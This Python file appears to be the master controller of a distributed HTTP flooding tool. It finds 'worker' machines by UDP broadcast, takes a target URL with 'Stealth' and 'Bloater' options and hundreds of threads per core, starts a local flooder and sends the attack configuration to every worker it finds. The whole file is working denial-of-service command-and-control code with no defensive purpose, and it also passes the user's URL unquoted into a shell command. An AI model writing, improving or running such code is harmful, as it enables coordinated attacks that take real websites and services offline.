import socket
import json
import os
import multiprocessing
import sys

# --- CONFIGURATION ---
PROJECT_DIR = os.path.dirname(os.path.abspath(__file__))
BEAMER_FILE = os.path.join(PROJECT_DIR, "blahajbeamer.py")
PORT = 55555
MAGIC_PING = b"BLAHAJ_PING"
MAGIC_ACK = b"BLAHAJ_ACK"

# Colors
LIGHT_BLUE = "\033[94m"
RESET = "\033[0m"

ASCII_SHARK = r"""
                                                         :                                          
                                                     :-===.                                         
                                                   .--==-:                                          
                                                  --====-                                           
                                                 =======-                                       -.  
                                                -=======-                                     ==-:  
                                               =-=====--.                                   ===-:   
                                              ==--====--                                  .====-    
                                             -=++=++++=:                                 -=+=--     
                                            =+++++++=-=-                                =+++=-.     
                                         .:-=+***++++=-:                              .======-      
                            ....:::::::::::::-----+*++=-.                -=          :=+++=-:       
               ...:::::::::::::::::::::::::::::-----:-::::.             ++=       .----++==-        
         ..----:::::-::----::::--------------------------::.-:-=:    .-+=-::::::-++=+-==+=-:        
      :-:===-::=-----::------------------------------====--.:-=-==-=:+-=+==-:-=--=+-=-=*+==--       
    --=-==+==-=-===----=---------------=----==============--:-=--*===--*+++==-==--==-+:**+++=-      
   =+++=----===-======------------========================-==----:#-+===+=++---=--:::. =+****+=.    
  -=+++==+====-=-:===--===============+===================-=-=--=-=+=+-=+-==-----:-.      =++++=:   
   -=++++*+=+++========+====+=+=++==++++==================----=--:+=-*--=--=-::::            =+==   
    =-+*++**++**+++*+*+++++++++++++++++++++++++++==========-=-=-----=-::-:--::                      
     .=+++*++++++*+***++++++++++++++++====+++++++========----=--=:----::--.                         
           .:-==+++*###++++++++++=++*++==+=+=+++=====--=-=-------:----.                             
                    -+++++++++=++++*++*++++++=+++====-------::--.                                   
                           .....-=+++++*++++++++=====:=.                                            
                                        .==***+*+++==:                                              
                                         =*+**+++*+=+-:                                             
                                         .+**=+**++++=---                                           
                            ..       ......:*++==+++*+=====.                                        
                                              .++++====+=++==-==-.                                  
                                                  .+++==+===+====+==                                
                                                         .:-==+=:                                   
"""

def main():
    if os.name == 'nt': 
        os.system('cls')
        os.system('color 09') # Sets the Light Blue background/text style

    print(f"{LIGHT_BLUE}{ASCII_SHARK}{RESET}")
    print(f"{LIGHT_BLUE}    >> MULTI-DEVICE OVERDRIVE MASTER <<{RESET}\n")
    
    # 1. Scanner
    print(f"[*] Scanning for Workers on port {PORT}...")
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    sock.setsockopt(socket.SOL_SOCKET, socket.SO_BROADCAST, 1)
    sock.settimeout(2.0)
    sock.sendto(MAGIC_PING, ('<broadcast>', PORT))
    
    workers = []
    try:
        while True:
            data, addr = sock.recvfrom(1024)
            if data == MAGIC_ACK: 
                workers.append(addr[0])
                print(f"    [+] {LIGHT_BLUE}Worker Online:{RESET} {addr[0]}")
    except: pass

    # 2. Settings
    print(f"\n{LIGHT_BLUE}--- SETUP ---{RESET}")
    url = input(f"Target URL: ").strip()
    bloat = input(f"Enable Bloater? (y/n): ").lower() == 'y'
    mode = "Stealth" if input(f"Mode [1. Std, 2. Stealth]: ") == "2" else "Standard"
    cores = input(f"Cores (Max {multiprocessing.cpu_count()}): ") or "1"
    threads = input(f"Threads per core [200]: ") or "200"

    # 3. Target Selection
    print(f"\n{LIGHT_BLUE}--- DEPLOYMENT ---{RESET}")
    print("[1] Local Only")
    print("[2] Workers Only")
    print("[3] Swarm (Both)")
    target_choice = input(f"Choice [3]: ") or "3"

    config = {
        "url": url, 
        "bloat": bloat, 
        "mode": mode, 
        "method": "POST" if bloat else "GET", 
        "cores": cores, 
        "threads": threads
    }

    # 4. Local Launch (System32 Fix)
    if target_choice in ["1", "3"]:
        print(f"[*] Starting local instance...")
        local_cmd = (
            f'start /D "{PROJECT_DIR}" cmd /k python "{BEAMER_FILE}" '
            f'--url {url} --mode {mode} --cores {cores} --threads {threads} '
            f'--bloat {"y" if bloat else "n"}'
        )
        os.system(local_cmd)

    # 5. Worker Broadcast
    if target_choice in ["2", "3"] and workers:
        package = f"LAUNCH|{json.dumps(config)}".encode()
        for ip in workers:
            print(f"[*] Syncing swarm to {LIGHT_BLUE}{ip}{RESET}...")
            sock.sendto(package, (ip, PORT))
    
    print(f"\n{LIGHT_BLUE}[+] Command Broadcasted. Check worker terminals.{RESET}")

if __name__ == "__main__":
    main()